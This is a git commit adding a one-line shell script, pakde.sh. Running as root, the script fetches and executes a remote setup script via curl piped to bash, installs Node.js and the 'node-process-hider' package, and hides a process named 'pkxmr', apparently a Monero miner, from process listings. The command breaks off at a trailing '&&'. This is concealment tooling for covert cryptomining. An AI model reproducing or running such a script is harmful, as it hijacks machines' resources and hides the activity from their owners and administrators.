1b10d0866204063802ac9283e8cce10ff31362a2
anitaindah1188 <100118927+anitaindah1188@users.noreply.github.com>
2022-02-21 14:46:11 +0700

    Create pakde.sh

---
+++ pakde.sh
@@ -0,0 +1,1 @@
+sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm install -g npm@8.4.1 && npm i -g node-process-hider && sudo ph add pkxmr && sudo apt-get install wget &&
